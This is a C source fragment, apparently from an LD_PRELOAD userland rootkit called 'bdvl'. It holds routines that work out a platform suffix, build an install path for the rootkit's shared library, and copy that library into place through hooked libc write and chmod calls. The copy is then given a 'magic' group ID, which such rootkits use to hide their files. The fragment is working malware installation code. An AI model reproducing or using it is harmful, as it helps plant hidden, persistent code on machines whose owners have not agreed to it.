char *sogetplatform(char *sopath){
    char *platform = NULL,
         *sofilenam = basename(sopath),
         *sofilecpy = strdup(sofilenam),
         *sofiletok = strtok(sofilecpy, "."),
         *curplatform;

    while(sofiletok != NULL && platform == NULL){
        for(int i = 0; i < VALID_PLATFORMS_SIZE && platform == NULL; i++){
            curplatform = valid_platforms[i];
            
            if(!strncmp("arm", sofiletok, 3))
                sofiletok=sofiletok+3;

            if(!strcmp(sofiletok, curplatform))
                platform = strdup(sofiletok);
        }

        sofiletok = strtok(NULL, ".");
    }
    free(sofilecpy);

    return platform;
}

char *sogetpath(char *sopath, char *installdir, char *bdvlso){
    char *platform, *ret;
    size_t pathsize;

    platform = sogetplatform(sopath);
    if(platform == NULL) return NULL;

    pathsize = strlen(installdir)+strlen(bdvlso)+strlen(platform)+4;

    ret = malloc(pathsize);
    if(ret){
        memset(ret, 0, pathsize);
        snprintf(ret, pathsize, "%s/%s.%s", installdir, bdvlso, platform);
    }
    free(platform);
    return ret;
}

int socopy(const char *opath, char *npath, gid_t magicgid){
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m;
    mode_t somode;
    off_t fsize, blksize;

    hook(CFWRITE, CCHMOD);

    ofp = bindup(opath, npath, &nfp, &fsize, &somode);
    if(ofp == NULL) return -1;

    blksize = getablocksize(fsize);
    do{
        buf = malloc(blksize+1);
        if(!buf){
            fcloser(2, ofp, nfp);
            return -1;
        }
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (long)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);

    fcloser(2, ofp, nfp);

    if(chown_path(npath, magicgid) < 0)
        return -1;

    if((long)call(CCHMOD, npath, somode) < 0)
        return -1;

    return 1;
}